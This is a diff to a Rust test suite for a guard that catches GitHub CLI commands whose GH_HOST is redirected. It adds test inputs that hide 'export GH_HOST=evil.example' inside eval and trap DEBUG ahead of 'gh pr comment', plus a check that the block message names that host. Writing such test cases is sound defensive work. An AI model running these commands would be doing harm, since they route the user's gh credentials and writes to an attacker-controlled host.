@@ -10183,9 +10183,26 @@ mod tests {
             "command -p -- export GH_HOST=evil.com; gh issue create -R cameronsjo/x -t a -b b",
             // N-2: a function named as the action.
             "f(){ export GH_HOST=evil.com; }; trap f DEBUG; gh issue create -R cameronsjo/x -t a -b b",
+            // Code review of #1471: an `eval` of a variable the command
+            // assigns in plain text reads that text, and a trap action whose
+            // command word is literal `export` sets GH_HOST from a value only
+            // the shell knows. Neither is an unread expansion.
+            "X='export GH_HOST=evil.example'; eval \"$X\"; gh pr comment 1 -R cameronsjo/x --body x",
+            "trap \"export GH_HOST=$H\" DEBUG; gh pr comment 1 -R cameronsjo/x --body x",
         ] {
             run_case(&mut bad, command, true);
         }
+        // The visible assignment is read, not only flagged as a mention: the
+        // block names the host it sets.
+        with_env(&owners_env(), || {
+            let result = GhWriteGuard.run(&input_with(
+                "X='export GH_HOST=evil.example'; eval \"$X\"; gh pr comment 1 -R cameronsjo/x --body x",
+                "/tmp",
+            ));
+            if !msg(&result).contains("evil.example/cameronsjo/x") {
+                bad.push(format!("eval of a visible assignment: {}", msg(&result)));
+            }
+        });
         for command in [
             // An `eval` or `trap` of an expansion is text the guard cannot
             // read, so it steps aside (cadence-ecosystem ADR-0046 rule 3).
